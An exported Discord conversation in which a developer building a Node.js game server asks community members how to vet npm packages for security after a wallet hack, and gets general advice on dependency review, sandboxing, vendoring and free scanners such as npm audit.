+[25-Oct-21 03:40 AM] cryptosammy#3587
+Packages, software, things are made by human beings. And sometimes, I blindly do use npm packages. If I didn't had that notice from Dependabot, I'd probably build the whole Lore MMO server on these insecure packages. So, I know NOW not to blindly pick a package. However, I still do not have the experience, the knowledge how to really verify how "secure" a package is. The reason to use packages are to speed up development. I am not sure how the Agama wallet hack took place, but the story about a single package can be overlooked by many people. 
+
+Please, do tell someone like me, someone who has been recently using JavaScript/Node, how to be cautious in regard to NPM packages. Teach me, and others - who will certainly follow - how to be less blind. What checklists should at least be done (and I get that you have to be abstract, but being specific will be more helpful) that someone can do themselves without directly hiring a security expert (because budget and availability are not always there). I really would like to learn how to work towards a secure environment - I have to, as my responsibility to future players, requires I do my best to provide a safe stack of technology.
+
+
+[25-Oct-21 07:53 AM] ComputerGenie#7004
+> Please, do tell someone like me, someone who has been recently using JavaScript/Node, how to be cautious in regard to NPM packages.
+1) I'm not some happy happy saint that never uses npm (most of my public repos do use it)
+2) We all use it in production more from a place of laziness than any actual necessity 
+3) For every step of convenience we take, we take one to three steps further from security (this includes all of life, not just code)
+4) My comment about "blindly" was more aimed at those just randomly plunking something into a meaningful project, sticking it into production, and consciously or unconsciously praying that nothing goes wrong; not aimed at those looking at things and trying to safely (or as safely as they can) learn
+5) see 3)
+6) Always use things in some sort of sandbox environment unless you are personally 100% sure they are safe (take it from someone who lost $40k playing stupid games and winning stupid prizes by *not* doing that)
+7) see 3)
+
+{Reactions}
+🍴 
+
+[25-Oct-21 08:18 AM] cryptosammy#3587
+@ComputerGenie makes perfect sense, but in my case convenience is that building it myself would most likely create a worse threat of security than work made by someone far better qualified. As you are way more experienced in these matters - otherwise your remarks wouldn't make sense - I would like to have a more "hands on" recipe. Let me try to explain. There is butter, flower, eggs, sugar, yeast and when mixed in a good proportion, they become a mix for cake. A good oven, the right temperature and time results in a really good cake. However, I skip the sugar, yeast and flower by buying a "cake mix" package. Yup, for convenience, so lets stick to that. I learn by watching a news bulletin that cake mixes can result in hairy legs and large fangs. I get paranoid and want to avoid all cake mixes, while there are many good cakemixes out there. I am asking you how I should read the information on the back of the cake mix package. What should I look for, what are the obvious red flags I should look for, if I should test it, how do I test it and what for? What tools do I use? Which sources are reliable? 
+
+I hope you can help to become a little more knowledgeable.
+
+
+[25-Oct-21 08:21 AM] cryptosammy#3587
+*NPM is not doing any checks whatsoever. They are just a registry. The whole thing is built on the trust in the dev community and sharing.*
+
+
+[25-Oct-21 08:46 AM] cryptosammy#3587
+**Question 1**
+How do you look at online security scanners, such as Snyk? Do you have alternatives that are open source or like a platform that can be setup without paying a monthly fee (so a budget can go to a contributor)?
+
+
+[25-Oct-21 08:50 AM] cryptosammy#3587
+**Question 2**
+How can security scanning go hand in hand with daily coding?  There is a lot of coding mixes in Lore of the Tokels. Where can I find help in this regard?
+
+
+[25-Oct-21 08:51 AM] cryptosammy#3587
+**Question 3**
+There must be a lot of people with a security background in coding, or maybe an institute or group that can review all code. Which party or who should I look into?
+
+
+[25-Oct-21 08:52 AM] ComputerGenie#7004
+OK, think of it this way:
+you want to make a cake....
+you need butter, flower, eggs, sugar, yeast
+but, instead of butter you use some random supplier who uses a 15th party producer who, instead of butter, substitutes battery acid for citric acid in their production of margarine and sends that instead
+are you really better off than whatever lumpy cake you'd have made on your own?
+
+
+[25-Oct-21 08:53 AM] cryptosammy#3587
+ok, so what you say is to look at the dependencies of my dependency
+
+
+[25-Oct-21 08:53 AM] ComputerGenie#7004
+yes, that too
+
+
+[25-Oct-21 08:53 AM] cryptosammy#3587
+if the trail is too long, thats a red flag
+
+
+[25-Oct-21 08:55 AM] cryptosammy#3587
+so what if I don't know how to get butter or without butter there won't be a cake for the party where the guests are anxiously waiting for the cake. How can I test for battery acid? And go for the next one, until I am sure there won't be battery acid in the cake? Or even better, how can I test my own code for not having battery acid as I am blind 😄
+
+
+[25-Oct-21 08:55 AM] ComputerGenie#7004
+my best suggestion is
+"never get in over your head"
+pull everything you work with/on apart and learn "what makes it tick", then do it over yourself and/or incorporate some/all of it directly (rather than a changeable by someone else "package")
+
+
+[25-Oct-21 08:56 AM] ComputerGenie#7004
+follow the code and learn what it does when
+once you understand it, use it
+
+
+[25-Oct-21 08:56 AM] ComputerGenie#7004
+side by side, a search engine and existing code can be powerful learning tools
+
+
+[25-Oct-21 09:01 AM] ComputerGenie#7004
+> Or even better, how can I test my own code for not having battery acid as I am blind
+literally look at the code and search for what it means/does
+search 1: in the code itself (is this a self-referencing function?)
+search 2: online ("OK, it's a node/js function, what does it do?")
+literally line by line until you understand every line
+now move on to the next thing
+you'll have less and less to search with each thing you look at because you learned things from the previous looking
+
+
+[25-Oct-21 09:02 AM] cryptosammy#3587
+*side by side, a search engine and existing code can be powerful learning tools*
+Search engines can give misleading results. I see some good, some bad. I am asking you about your experiences and which tools you would pick.
+
+
+[25-Oct-21 09:02 AM] cryptosammy#3587
+(I have no idea what a self referencing function is)
+
+
+[25-Oct-21 09:03 AM] cryptosammy#3587
+(or how to recognise one)
+
+
+[25-Oct-21 09:05 AM] ComputerGenie#7004
+> I am asking you about your experiences and which tools you would pick.
+literally what I did when teaching myself
+goggle "node.js" and <https://www.w3schools.com/js/default.asp>, find resources that explain what the functions are called and what they do
+
+
+[25-Oct-21 09:06 AM] ComputerGenie#7004
+means the function is not part of js or node, but rather a function defined elsewhere in the code
+
+one example would be in the `promise` code...
+`onFulfilled` and`onRejected` are functions created inside the code and not inside node or js itself
+
+
+[25-Oct-21 09:12 AM] cryptosammy#3587
+*literally what I did when teaching myself*
+I really see how gifted you are and why I keep yammering to learn from you. I hope you can see that not everyone - wait, lets keep this to me - that I am not so gifted. I have concentration problems and sometimes I see things but more than often I overlook things or compulsively. I clicked on the link and I do not see anything about a self referencing function. I try to understand why these kind of functions are a security threat.
+
+
+[25-Oct-21 09:12 AM] cryptosammy#3587
+(dont have the slightest clue what promises are)
+
+
+[25-Oct-21 09:14 AM] ComputerGenie#7004
+I'm far from "gifted" 
+When I started, I made more things that didn't work than did (just like every beginner)
+
+
+[25-Oct-21 09:15 AM] ComputerGenie#7004
+being self-taught is more rewarding (imo), but it takes far more work, discipline, and drive to get "there"
+
+
+[25-Oct-21 09:17 AM] cryptosammy#3587
+Nevermind I have found some resources.
+
+
+[25-Oct-21 09:18 AM] cryptosammy#3587
+got this link from a friendly community member
+
+
+[25-Oct-21 09:18 AM] cryptosammy#3587
+https://github.com/proplatformers/security-101-for-saas-startups
+
+{Embed}
+https://github.com/proplatformers/security-101-for-saas-startups
+GitHub - proplatformers/security-101-for-saas-startups: security ti...
+security tips for startups. Contribute to proplatformers/security-101-for-saas-startups development by creating an account on GitHub.
+https://images-ext-1.discordapp.net/external/4XId8whLM36NM4ub2gYKaLhCPnMe3Hr7xGgnXxMmWVI/https/opengraph.githubassets.com/7a240a5e903617b7b5fe517f14a7436e26e9ddd8f7638e0a33c5f5fe3ec13b3d/proplatformers/security-101-for-saas-startups
+
+
+[25-Oct-21 09:18 AM] cryptosammy#3587
+(in case someone was following my confused talkatitle)
+
+
+[25-Oct-21 09:18 AM] ComputerGenie#7004
+the only one that codes nothing wrong is the one that codes nothing
+
+
+[25-Oct-21 09:30 AM] cryptosammy#3587
+*Snyk is free for open source projects*
+
+
+[25-Oct-21 09:31 AM] cryptosammy#3587
+*The npm audit is a great free tool for package vulnerability awareness.*
+
+
+[25-Oct-21 10:35 AM] grewalsatinder#9653
+there are some practice a dev can adopt to have better security for any programming languge:
+- Any 3rd party package/module/plugin which is required to be used should be forked or just directly included a copy of it to the source code.
+- Review and merge updates from these 3rd party dependencies. Put a watch/noticiations on updates for these 3rd party dependencies on Github if possible. Send notificaitons right in the email.
+
+It is usual than more work to handle using 3rd party dependencies this way, but at least it's safer.
+But in case of Node.js it's a great pain and a mess!
+For that reason, I looked around to divert to some other different langauges options and started learning and using Golang. Turns out, even that's insufficient, and you has to know C language as well if need to interact with different langauges. 😅 So, went through C lanuage as well afer almost 2 decades of touching that lanuage in graduate classes.
+For a programmer, there is no actual focused thing. Things are moving far and wide in so many directions, you can't live without knowing and understanding many different things.
+Hope you find your peace in coding too 🤞🖖
+
+{Reactions}
+💯 
+
+[25-Oct-21 10:37 AM] cryptosammy#3587
+Thank you! Forking and using watches make sense. Instead of email, is there a tool that consumes all ? I am already thinking about a Bot. GitHub integrations are on my todo list.
+
+
+[25-Oct-21 10:38 AM] grewalsatinder#9653
+Just get away from Node.js if possibly can 😅
+
+
+[25-Oct-21 10:41 AM] BitSec#1898
+@grewalsatinder not even that just write everything yourself from scratch xD
+
+
+[25-Oct-21 10:42 AM] grewalsatinder#9653
+in all seriousness, even better
+
+
+[25-Oct-21 10:42 AM] BitSec#1898
+I mean I wouldn't think so
+
+
+[25-Oct-21 10:43 AM] grewalsatinder#9653
+I know, we are lazy enough to think about it 😅
+
+
+[25-Oct-21 10:43 AM] BitSec#1898
+Chances that you make a mistake / create a bug is probably higher dont you think?
+
+
+[25-Oct-21 10:43 AM] grewalsatinder#9653
+but there are actually some really skilled coders who actually does that
+
+
+[25-Oct-21 10:43 AM] BitSec#1898
+Or at least for me. I for sure will fuck up something xD creating major bug / exploit in core code haha
+
+
+[25-Oct-21 10:43 AM] BitSec#1898
+I know haha xD I am not one of them I'll be honest haha
+
+
+[25-Oct-21 10:44 AM] grewalsatinder#9653
+if you are capable enough to code things from scratch, then you are also capable to fix criticle bugs too
+
+
+[25-Oct-21 10:44 AM] BitSec#1898
+True if you know what the bug is you can probably fix it. I don't think I've ever heard about a bug that was unable to be fixed.
+
+
+[25-Oct-21 10:45 AM] BitSec#1898
+I only heard about bugs that would not get fixed because it would take too long to dig through all the legacy code etc xD
+
+
+[25-Oct-21 10:45 AM] grewalsatinder#9653
+yep
+
+
+[25-Oct-21 10:46 AM] grewalsatinder#9653
+I tried to do the same from scratch and importing code to my own code in my kmdgo and saplinglib packages
+
+
+[25-Oct-21 10:46 AM] grewalsatinder#9653
+https://github.com/satindergrewal/kmdgo
+
+
+[25-Oct-21 10:47 AM] grewalsatinder#9653
+https://github.com/satindergrewal/saplinglib
+
+
+[25-Oct-21 10:51 AM] ComputerGenie#7004
+better to create your own bug than import someone else's hack into your wallet, no?
+
+
+[25-Oct-21 10:51 AM] BitSec#1898
+I mean depends who that someone else is I guess.
+
+
+[25-Oct-21 10:52 AM] BitSec#1898
+By the time you've created your entire application you have so much code it'll become impossible to be aware of all security risks.
+
+
+[25-Oct-21 10:53 AM] ComputerGenie#7004
+I sent 10k SAFE to a malformed valid addy because of a screwup I created and that's still better imo than the hack that started this convo
+
+
+[30-Oct-21 02:51 AM] definevalue#0001
+lol
+
+
+==============================================================
+Exported 566 message(s)
+==============================================================
